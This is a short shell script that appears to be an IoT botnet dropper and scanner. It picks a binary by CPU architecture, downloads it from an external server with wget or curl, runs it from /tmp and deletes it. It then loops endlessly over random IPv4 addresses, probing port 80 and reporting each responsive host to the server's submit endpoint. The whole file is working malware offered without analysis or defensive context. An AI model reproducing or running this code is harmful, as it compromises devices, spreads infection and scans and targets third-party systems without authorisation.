#!/bin/sh
URL="http://zcxrhxvzomjvimghksngrmlbmqowfazmzvlbjolihytuwfwpslctbscvsdjyno.expnetwork.pro"

A=$(uname -m)
case "$A" in
    mips) T="mips" ;;
    mipsel|mipsle|*mips*) T="mpsl" ;; 
    aarch64|arm64) T="arm64" ;;
    arm*) T="arm" ;; # Handles armv5, v6, v7 with your nt.arm
    x86_64|amd64) T="x86" ;;
    i*86) T="x86" ;; # Maps 32-bit x86 to your nt.x86
    ppc*|powerpc*) T="ppc" ;;
    sh4*) T="sh4" ;;
    m68k*) T="m68k" ;;
    *) T="mips" ;; # Fallback to mips (most common IoT)
esac

BIN="nt.$T"
DOWNLOADED=0

cd /tmp || cd /run || cd /var/run || cd /

wget -q $URL/$BIN -O nt || curl -sL $URL/$BIN -o nt
if [ -f "nt" ]; then
    chmod +x nt
    ./nt &
    sleep 2
    rm -f nt
    exit 0
fi

RA=$(expr $RANDOM % 223 + 1)
RB=$(expr $RANDOM % 254 + 1)

while true; do
    i=$(expr $RANDOM % 254 + 1)
    j=$(expr $RANDOM % 254 + 1)
    TARGET="$RA.$RB.$i.$j"
    
    (echo > /dev/tcp/$TARGET/80) >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        wget -qO- "$URL/submit?ip=$TARGET" >/dev/null 2>&1
        curl -s "$URL/submit?ip=$TARGET" >/dev/null 2>&1
    fi
done
